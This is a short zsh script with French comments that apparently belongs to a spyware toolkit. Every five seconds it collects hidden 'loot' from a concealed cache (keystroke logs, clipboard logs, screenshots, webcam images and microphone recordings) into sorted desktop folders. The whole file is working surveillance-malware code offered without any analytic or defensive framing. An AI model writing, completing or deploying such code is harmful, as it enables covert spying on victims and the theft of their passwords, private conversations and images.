#!/bin/zsh
# delivery/collecteur.sh - synchronise le butin cache vers le Bureau, 5 s
BASE="$HOME/Desktop/RickPortal/Reception"
SRC="$HOME/Library/Application Support/RickCache"
mkdir -p "$BASE/Clavier" "$BASE/Micro" "$BASE/Webcam" "$BASE/Ecrans" "$BASE/Presse-papiers" "$BASE/Shells"
while true; do
    rsync -a "$SRC/.sys.log" "$BASE/Clavier/" 2>/dev/null
    rsync -a "$SRC/.clip.log" "$BASE/Presse-papiers/" 2>/dev/null
    rsync -a "$SRC/scr/"  "$BASE/Ecrans/"   2>/dev/null
    rsync -a "$SRC/cam/"  "$BASE/Webcam/"   2>/dev/null
    rsync -a "$SRC/mic/"  "$BASE/Micro/"    2>/dev/null
    sleep 5
done
